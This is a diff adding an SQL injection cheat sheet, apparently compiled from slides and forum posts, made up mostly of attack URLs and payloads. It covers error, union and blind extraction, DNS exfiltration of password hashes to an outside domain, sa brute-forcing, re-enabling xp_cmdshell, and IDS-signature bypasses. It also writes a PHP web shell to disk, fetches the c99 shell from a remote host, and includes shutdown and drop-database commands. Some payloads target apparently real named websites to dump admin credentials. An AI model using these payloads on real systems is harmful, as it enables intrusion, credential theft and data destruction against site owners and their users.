@@ -1,0 +1,567 @@
+site.com/picture.php?files_mysql.php
+
+ADVANCED SQL
+
+*********************************************************************************************************
+type of injection
+
+this is our Error-Based, and Union-Based SQL Injections
+http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
+Syntax error converting the nvarchar value '[j0e]' to a column of data type int.
+
+
+This is another way of getting the data out of the server (such as http, or dns).
+http://[site]/page.asp?id=1;declare @host varchar(800); select @host = name + '-' + 
+master.sys.fn_varbintohexstr(password_hash) + '.2.pwn3dbyj0e.com' from 
+sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');--
+
+
+
+ 
+The latter case is known as "Blind SQL Injection".
+http://[site]/page.asp?id=1;if+not(select+system_user)+<>+'sa'+waitfor+delay+'0:0:5'--
+Ask it if it's running as 'sa'
+
+*********************************************************************************************************
+
+Determine the Injection Type : integer or string
+
+Integer Injection:
+http://[site]/page.asp?id=1 having 1=1--
+Column '[COLUMN NAME]' is invalid in the select list because it is not
+contained in an aggregate function and there is no GROUP BY clause.
+String Injection:
+http://[site]/page.asp?id=x' having 1=1--
+Column '[COLUMN NAME]' is invalid in the select list because it is not
+contained in an aggregate function and there is no GROUP BY clause.
+
+
+Determining this is what determines if you need a ' or not.
+
+
+*********************************************************************************************************
+http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
+Syntax error converting the nvarchar value '[DB USER]' to a column of
+data type int.
+Grab the database user with USER
+Grab the database name with DB_NAME
+Grab the servername with @@servername
+Grab the Windows/OS version with @@version
+Error-Based SQL Injection Syntax for
+extracting the USER 
+
+
+
+*********************************************************************************************************
+ 
+http://[site]/page.asp?id=1 UNION SELECT ALL 1--
+All queries in an SQL statement containing a UNION operator must have an equal number of 
+expressions in their target lists.
+http://[site]/page.asp?id=1 UNION SELECT ALL 1,2--
+All queries in an SQL statement containing a UNION operator must have an equal number of 
+expressions in their target lists.
+http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3--
+All queries in an SQL statement containing a UNION operator must have an equal number of 
+expressions in their target lists.
+http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3,4--
+NO ERROR
+http://[site]/page.asp?id=null UNION SELECT ALL 1,USER,3,4--
+Union-Based SQL Injection Syntax for extracting the USER 
+
+*********************************************************************************************************
+
+3 - Total Characters
+http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 
+Valid page returns after 10 second delay
+Blind SQL Injection Syntax for extracting the USER 
+
+*********************************************************************************************************
+
+ 
+D  - 1st Character
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))>97) WAITFOR DELAY '00:00:10'
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 
+Valid page returns after 10 second delay
+Blind SQL Injection Syntax for extracting the USER 
+
+B - 2nd Character
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'-- 
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds) )
+Valid page returns after 10 second delay
+
+ 
+O - 3rd Character
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'-- 
+Valid page returns immediately
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))>98) WAITFOR DELAY '00:00:10'--
+Valid page returns immediately
+.....and so on
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'-- 
+Valid page returns after 10 second delay
+Database User = DBO
+
+ *********************************************************************************************************
+http://[site]/page.php?id=null union all select 1,user(),3,4,5/*
+http://[site]/page.php?id=null union all select 1,2,database(),4,5/*
+http://[site]/page.php?id=null union all select 1,@@version,@@datadir,4,5/*
+Grab the database user with user()
+Grab the database name with database()
+Grab the database version with @@version
+Grab the database data directory with @@datadir
+Information Gathering
+
+*********************************************************************************************************
+ 
+Error-Based SQL Injection
+http://[site]/page.asp?id=2  or 1 in (select @@version)--
+Obtaining the version of the OS
+http://[site]/page.asp?id=2 or 1 in (select @@servername)--
+Obtaining the hostname of the server
+http://[site]/page.asp?id=2 or 1 in (select user)--
+Obtaining the user
+http://[site]/page.asp?id=2 or 1 in (select db_name(N))--
+Obtaining the database name(s). N = start with 0 and keep incrementing
+Basic SQLI Attack Methods
+
+
+
+
+
+*********************************************************************************************************
+ 
+Union-Based SQL Injection
+http://[site]/page.asp?id=1 UNION SELECT ALL 1--
+All queries in an SQL statement containing a UNION operator must have an equal number 
+of expressions in their target lists.
+http://[site]/page.asp?id=1 UNION SELECT ALL 1,2--
+http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3--
+http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3,4--
+NO ERROR
+You should receive the error with each request, errors not shown to make room for the 
+slide
+Basic SQLI Attack Methods
+
+
+
+*********************************************************************************************************
+ 
+True-False Blind SQL Injection 
+http://www.site.com/page.php?id=66 AND 1=1-- Valid Page
+http://www.site.com/page.php?id=66 AND 1=2-- Error Page
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 1, 1)) > 51 3
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 1, 1)) > 53 5
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 1, 1)) > 52 4
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 2, 1)) > 43 +
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 2, 1)) > 45 -
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 2, 1)) > 46 .
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 3, 1)) > 51 3
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 3, 1)) > 49 1
+http://www.site.com/page.php?id=66 AND ORD(MID((VERSION()), 3, 1)) > 48 0
+MID() Extract characters from a text field
+retrieved version: 5.0.45
+Basic SQLI Attack Methods
+
+
+*********************************************************************************************************
+
+ 
+Time-Based Blind SQL Injection
+http://[site]/page.asp?id=1;waitfor+delay+'0:0:5';--
+See if it takes 5 seconds to return the page. If it does, then you can ask it questions.
+http://[site]/page.asp?id=1;if+not(substring((select+@@version),%,1)+<>+5)+waitfor
++delay+'0:0:5';--
+Ask it if he is running SQL Server 2000
+http://[site]/page.asp?id=1;if+not(select+system_user)+<>+'sa'+waitfor+delay+'0:0:5'--
+Ask it if it's running as 'sa'
+http://[site]/page.asp?id=1;if+is_srvrolemember('sysadmin')+>+0+waitfor+delay+'0:0:5';--
+Ask it if the current user a member of the sysadmin group
+Basic SQLI Attack Methods
+
+
+
+*********************************************************************************************************
+ 
+http://www.http://www.liljon.com/liljon.asp?lil='
+Gives the error:
+Microsoft OLE DB Provider for SQL Server error '80040e14'
+http://www.liljon.com/liljon.asp?lil=71%20or%201=convert(int,(USER))--
+Gives the error:
+Microsoft OLE DB Provider for SQL Server error '80040e14'
+Incorrect syntax near ')'.
+Hmm....ok, so it doesn't like that right paren so let's add one more to the end of our query.
+http://www.liljon.com/liljon.asp?lil=71%20or%201=convert(int,(USER)))--
+Gives the error:
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+Conversion failed when converting the nvarchar value 'liljon' to data type int.
+Now we know every injection from here on out will require the additional right paren....
+@@servername()), @@version()), db_name()), etc....
+UGGGGHHH.....WTF???  (1)
+
+
+http://www.liljon.com/liljon.asp?lil=71%20or%201=convert(int,(DB_NAME())))-
+Gives the error:
+Conversion failed when converting the nvarchar value 'yeaaaaaah' to data type int.
+http://www.liljon.com/liljon.asp?lil=71%20or%201=convert(int,(@@VERSION)))-
+Gives the error:
+Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2005 - 9.00.3054.00 (Intel X86) Mar 23 
+2007 16:28:52 Copyright (c) 1988-2005 Microsoft Corporation Workgroup Edition on Windows NT 5.2 (Build 3790: 
+Service Pack 2) ' to data type int.
+UGGGGHHH.....WTF???  (1) Cont.
+*********************************************************************************************************
+ 
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2--
+Received error: The text, ntext, or image data type cannot be selected as DISTINCT.
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO')--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5,6--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5,6,7--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5,6,7,8--
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5,6,7,8,9--
+Received error: Operand type clash: text is incompatible with int
+http://www.site.com/page.php?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5,6,7,8,null--
+Tips:
+1. Always use UNION with ALL because of image similiar non-distinct field types. By default union tries to get records 
+with distinct.
+2. Use NULL in UNION injections for most data type instead of trying to guess string, date, integer
+UGGGGHHH.....WTF???  (2)
+
+*********************************************************************************************************
+ 
+Step 1: Brute-Force the 'sa' password
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'JOE','waitfor 
+delay ''0:0:50'';select 1;');&a=1
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'joe','waitfor 
+delay ''0:0:50'';select 1;');&a=1
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','waitfor 
+delay ''0:0:50'';select 1;');&a=1
+Key point to remember is that we used time-based blind sqli to enumerate the sa account 
+password length. This is a great aid in bruteforcing.
+Privilege Escalation
+
+
+
+Step 2: Add current user to admin group
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','exec 
+master..sp_addsrvrolemember ''sa'',''sysadmin'';select 1');&a=1
+Key point to remember is that we used time-based blind sqli to enumerate the sa account 
+password length. This is a great aid in bruteforcing.
+*********************************************************************************************************
+
+ 
+Step 3: Recreate the xp_cmdshell stored procedure
+MSSQL Server 2000
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','select 
+1;exec master..sp_dropextendedproc ''xp_cmdshell'';')&a=1
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','select 
+1;DECLARE @result int,@OLEResult int,@RunResult int,@ShellID int EXECUTE 
+@OLEResult=sp_OACreate ''WScript.Shell'',@ShellID OUT IF @OLEResult<>0 SELECT 
+@result=@OLEResult IF @OLEResult<>0 RAISERROR(''CreateObject %0X'',
+14,1,@OLEResult) EXECUTE @OLEResult=sp_OAMethod @ShellID,''Run'',Null,''ping -n 8 
+127.0.0.1'',0,1IF @OLEResult<>0 SELECT @result=@OLEResult IF @OLEResult<>0 
+RAISERROR (''Run %0X'',14,1,@OLEResult) EXECUTE @OLEResult=sp_OADestroy 
+@ShellID');&a=1
+Remember to correctly identify the backend version as this step because MS SQL 2000 
+handle this differently than MS SQL 2005
+Privilege Escalation
+
+
+
+*********************************************************************************************************
+ 
+Step 3: Recreate the xp_cmdshell stored procedure (What's really going on?)
+select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','select 1;
+DECLARE @result int,@OLEResult int,@RunResult int,@ShellID int 
+EXECUTE @OLEResult=sp_OACreate ''WScript.Shell'',@ShellID OUT IF @OLEResult<>0 
+SELECT @result=@OLEResult IF @OLEResult<>0 RAISERROR(''CreateObject%0X'',14,1,@OLEResult) 
+EXECUTE @OLEResult=sp_OAMethod @ShellID,''Run'',Null,''ping -n 8 127.0.0.1'',0,1IF @OLEResult<>0 
+SELECT @result=@OLEResult IF @OLEResult<>0 
+RAISERROR (''Run %0X'',14,1,@OLEResult) EXECUTE @OLEResult=sp_OADestroy @ShellID');&a=1
+Privilege Escalation
+
+*********************************************************************************************************
+
+Step 3: Recreate the xp_cmdshell stored procedure
+MSSQL Server 2005 (re-enabling xp_cmdshell)
+http://[site]/page.asp?id=1;select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','select 
+1;exec master..sp_configure ''show advanced options'',1;reconfigure;exec 
+master..sp_configure ''xp_cmdshell'',1;reconfigure')&a=1 
+http://[site]/page.asp?id=1;exec master..sp_configure 'show advanced options',
+1;reconfigure;exec master..sp_configure 'ole automation procedures',1;reconfigure;&a=1
+Privilege Escalation
+
+*********************************************************************************************************
+
+Server-side Alphanumeric Filter
+http://[site]/page.asp?id=2 or 1 like 1
+Here we are doing an “or true,” although this time we are using the “like” 
+comparison instead of the “=” sign. We can use this same technique for the other 
+variants such as “and 1 like 1” or “and 1 like 2”
+http://[site]/page.asp?id=2 and 1 like 1
+http://[site]/page.asp?id=2 and 1 like 2
+Restrictive Blacklist
+
+
+Bypass Techniques:
+http://[site]/page.asp?id=2 or 2=2--
+http://[site]/page.asp?id=2 or 1<2--
+http://[site]/page.asp?id=2 or 1 like 1--
+http://[site]/page.asp?id=2 /**/or /**/2/**/=/**/2--
+....c'mon everyone name some more
+
+
+
+
+*********************************************************************************************************
+ 
+Signature 2
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection attempt”;
+flow: to_server, established; pcre: “/(and|or) 1=1 (\-\-|\/\*|\#)/i”; sid: 1; rev:2;)
+Bypass Techniques:
+http://[site]/page.asp?id=2 or 2=2%2D%2D
+http://[site]/page.asp?id=2 or 1<2%2D%2D
+http://[site]/page.asp?id=2 or 1 like 1%2D%2D
+http://[site]/page.asp?id=2 /**/or /**/2/**/=/**/2%2D%2D
+....c'mon everyone name some more
+Signature Negatives
+- 1=1 is not the only way to create a query that returns "true" (ex: 2=2, 1<2, etc)
+- Comments like pretty much anything else can be represented in other encoding type
+(ex: (%2D%2D = --)
+- It is possible to attack an sql injection vulnerability without using comments
+If this signature is so easily bypassed, what is it actually good for?
+Answer:
+Again, it's great for automated tools and kiddies
+Signature Based IDS (2)
+
+
+
+*********************************************************************************************************
+ 
+Signature 3-5
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection SELECT 
+statement”; flow: to_server, established; pcre:”/select.*from.*(\-\-|\/\*|\#)/i”; sid: 2; rev: 1;)
+                
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection UNION
+statement”; flow: to_server, established; pcre:”/union.*(\-\-|\/\*|\#)/i”; sid: 3; rev: 1;)
+Bypass Techniques:
+http://[site]/page.asp?id=2 or 2 in (%73%65%6C%65%63%74%20%75%73%65%72)%2D%2D
+http://[site]/page.asp?id=2 or 2 in (select user)--
+http://[site]/page.asp?id=-2 %55%4E%49%4F%4E%20%41%4C%4C%20%73%65%6C%65%63%74%201,2,3,(%73%65%6C
+%65%63%74%20%75%73%65%72),5,6,7%2D%2D
+http://[site]/page.asp?id=-2 UNION ALL select 1,2,3,(select user),5,6,7--
+....c'mon everyone name some more
+Signature Negatives
+- Although sigs 3-5 are much better, they don't consider the attacker may use different encoding types such as hex
+Signature Based IDS (3-5)
+
+
+
+
+*********************************************************************************************************
+
+Signature 6
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection SELECT statement”; flow: to_server, 
+established; pcre:”/(s|%73)(e|%65)(l|%6C)(e|%65)(c|%63)(t|%74).*(f|%66)(r|%72)(o|%6F)(m|%6D).*(\-\-|\/\*|\#)/i”; sid: 2; rev2
+Signature 7
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection SELECT statement”; flow: to_server, 
+established; pcre:”/(s|%73|%53)(e|%65|%45)(l|%6C|%4C)(e|%65|%45)(c|%63|%43)(t|%74|%45).*(f|%66|%46)(r|%72|%52)(o|
+%6F|%4F)(m|%6D|%4D).*(\-\-|\/\*|\#)/i”; sid: 2; rev: 3;)
+At least signature 7 takes into account case sensitivity with hex encoding.
+But.....
+There are always other encoding types that the attacker can use...
+Signature Based IDS (6-7)
+
+
+
+*********************************************************************************************************
+http://[site]/page.asp?id=2%20or%202%20in%20(/*IDS*/%73/*evasion*/%65/*is*/
+%6C/*easy*/%65/*just*/%63/*ask*/%74/*j0e*/%20%75/*to*/%73/*teach*/%65/*you*/
+%72/*how*/)%2D%2D
+What is passed to the db
+http://[site]/page.asp?id=2 or 2 in (select user)--
+in comments ("IDS evasion is easy just ask j0e to teach you how")
+
+
+*********************************************************************************************************
+bypass filter words
+/* !________ */
+http://www.marmoon.com/games.php?id=437%20/*!ORDER%20BY*/%2013--
+
+http://coffeagame.com/top.php?otsi=null' union select 1,unhex(hex(group_concat(m_kasutaja,0x3a,m_parool))),3,4,5,6,7,8,9,10,11,12,13,1 ?4,15 from coffea.user_table-- f
+
+http://iri.iiu.edu.pk/index.php?page_id=7+and+1=2+union+select+1,2,0x417474656d7074696e6720746f204861636b,4,5,group_concat(0x3c62723e3c62723e,user_name,0x3c62723e3c62723e,user_email,0x3c62723e3c62723e,user_pass_str,0x3c62723e3c62723e,user_pass,0x3c62723e3c62723e,user_type,0x3c62723e3c62723e+separator+0x20),7,8,9,10,11+from+user 
+
+
+http://www.techniques.com.pk/index.php?cat_id=3+and+1=3+union+all+select+1,group_concat(0x4841434b454420425920544543484e4f,0x3c62723e3c62723e,login,0x3c62723e3c62723e,password),3,0x4841434b454420425920544543484e4f,5,6,7,8,0x56554c4e455241424c4520544f2053514c20494e4a454354494f4e532e2046495820495420475559532021213c62723e3c62723e203a50203c62723e425945202121,10,11,12,13+from+techniqu_techniq.tbladmin
+
+
+http://www.maimonides.org/upper/newsDetail.php?id=170+and+1=3+union+all+select+1,group_concat(0x3c62723e3c62723e,username,0x3c62723e3c62723e,pwd,0x3c62723e3c62723e,email,0x3c62723e3c62723e+separator+0x3c62723e),3,4,5,6,7,8,9,10+from+users
+
+
+http://www.fpcci.com.pk/news1/display_newsDetail.asp?newsid=1000+and+1=3+union+all+select+1,2,3,4,5,password,name,8,9,10,11,12,13,14,15+from+admin
+
+     http://site.com/index.php?&option=com_mytube&Itemid=88&view=videos&type=member&user_id=62+AND+1=2+UNION+SELECT+0,1,2,3,4,5,6,7,8,9,10,11,concat%280x3a,username,0x3a,email,0x3a,activation%29,13,14,15,16,17,18,19,20,21,22,23,24,25+from+jos_users+where+id=62--
+
+
+	http://site.com/index.php?&option=com_mytube&Itemid=88&view=videos&type=member&user_id=62+AND+1=2+UNION+SELECT+0,1,2,3,4,5,6,7,8,9,10,11,concat%280x3a,username,0x3a,email,0x3a,activation%29,13,14,15,16,17,18,19,20,21,22,23,24,25+from+jos_users+where+id=62--
+
+
+http://www.commercial.southernrailway.go...8+and+1=0+ Union Select 1 ,2,concat(table_name,0x3a,column_name),4,5,6,7+from+information_schema.columns+where+table_schema=database()--	
+
+*********************************************************************************************************
+bsqli
+
+http://www.maimonides.org/upper/newsDetail.php?id=170/**/and/**/ascii(substring((select/**/concat(id,0x3a,username,0x3a,pwd,0x3a,email)/**/from/**/users/**/limit/**/[row],1),[+],1))=[char]--
+
+
+*********************************************************************************************************
+injecting shell
+
+.php?id=-1+union+select+1,2,3,4,5,'<?php @system($_REQUEST["cmd"]); ?>',6,7,8+INTO+DUMPFILE+'/home/username/public_html/images/shell.php'
+
+You will need to know document root eg. /home/username/public_html and to find any writeable directory on it to inject your shell. Than you navigate to your shell and type http://www.site.com/images/shell.php?cmd=ls
+
+.php?id=-1 union select 1,2,'your shell code here',4,5,6,7,8 INTO DUMPFILE '/document/root/folder/shell.php'
+
+Maybe you will need to HEX this 'your shell code here' and this '/document/root/folder/shell.php' or CHAR(). 
+*********************************************************************************************************
+php?cmd=wget http://www.localroot.net/c99ud.txt  -O c99.php so don't need to put all path cause the c99.php file will be created in the directory where you created your cmd shell.
+
+
+*********************************************************************************************************
+thedomain.com:2082
+thedomain.com:2083
+thedomain.com/admin
+admin.thedomain.com
+cpanel.thedomain.com
+
+
+
+*********************************************************************************************************
+In most cases there is no need to have all those symbols. + or /**/ or () for space is enough. 
+
+
+*********************************************************************************************************
+
+Exploit:
+If the value of $email is aaa@aaa.com' OR 1=1 INTO OUTFILE'/<directory-path>/pass.txt, the SQL request becomes:
+select passmd5 from people where email=' aaa@aaa.com' OR 1=1 INTO OUTFILE'/<directory-path>/pass.txt'
+
+Resulting in the passwords of the users being written into the file pass.txt.
+
+
+*********************************************************************************************************
+http://[site]/page.asp?id=1'a
+
+
+http://foo/web.php?table=38 - We get normal screen
+http://foo/web.php?table=38/*%20s*/ - We get normal screen
+http://foo/web.php?table=38/*!%20s*/ - We get a different screen because syntax error in comments - MySQL is in use
+http://foo/web.php?table=38/*!30000%20s*/ - We get a different screen, MySQL is at least 3.x.x
+http://foo/web.php?table=38/*!40000%20s*/ - We get a different screen, MySQL is at least 4.x.x
+http://foo/web.php?table=38/*!50000%20s*/ - We get normal screen, MySQL is below 5.x.x
+http://foo/web.php?table=38/*!40020%20s*/ - We get normal screen, MySQL is below 4.0.20
+http://foo/web.php?table=38/*!40017%20s*/ - We get a different screen, MySQL is at least 4.0.17
+http://foo/web.php?table=38/*!40018%20s*/ - We get normal screen, MySQL is below 4.0.18
+
+
+Starting scan for vuln in parameter id.
+
+1) mysite.com/index.php?id=1+and+1=1 (true and true = true)
+
+If u see page like with parameter id=1, maybe u have vuln parameter.
+
+mysite.com/index.php?id=1+and+1=2 (true and false = false)
+If u see empty page or error or redirect it says that u have vuln parameter
+
+2) mysite.com/index.php?id=1'+and+'1'='1 (true and true = true)
+mysite.com/index.php?id=1'+and+'1'='2 (true and false = false)
+
+3) mysite.com/index.php?id=1"+and+"1"="1 (true and true = true)
+mysite.com/index.php?id=1"+and+"1"="2 (true and false = false)
+
+4) mysite.com/index.php?id=1+order+by+1+--+
+mysite.com/index.php?id=1+order+by+1000+--+
+If u see empty page or error or redirect it says that u have vuln parameter
+
+5) mysite.com/index.php?id=1
+mysite.com/index.php?id=2-1
+
+6) mysite.com/index.php?id=1
+mysite.com/index.php?id=1*1
+
+7) mysite.com/index.php?id=
+If u see empty page or error or redirect it says that u have vuln parameter
+
+8) mysite.com/index.php?id=1'
+If u see empty page or error or redirect it says that u have vuln parameter
+
+9) mysite.com/index.php?id=1hello
+"Unknown column '1hello' in 'where clause" vuln
+
+10) site.com/index.php?id=1)/*
+
+11) site.com/index.php?id=1')--+
+
+12) site.com/index.php?id=1"/*
+
+13)site.com/index.php?id=1))--+
+
+
+Vuln parameters are not only parameters like "index.php?id=1:
+
+Code: [Select]
+mysite.com/index.php/id/6/
+mysite.com/index.HTM?id=1
+
+*********************************************************************************************************
+.asp?xxx=2 union select name from sysobjects where xtype='u'
+
+.asp?xxx=Select name from syscolumns where id=(select id from sysobjects where 
+name=‘table’)
+
+
+=2‘ union 
+select card_number from%20 bank_cards where '1'='1’
+
+=2; shutdown
+
+=2; drop database xxx
+
+*********************************************************************************************************
+
+
+
+*********************************************************************************************************
+
+
+
+*********************************************************************************************************
+
+
+
+*********************************************************************************************************
+
+
+
+
+*********************************************************************************************************
+
+
+
+*********************************************************************************************************
+
+
+
+*********************************************************************************************************
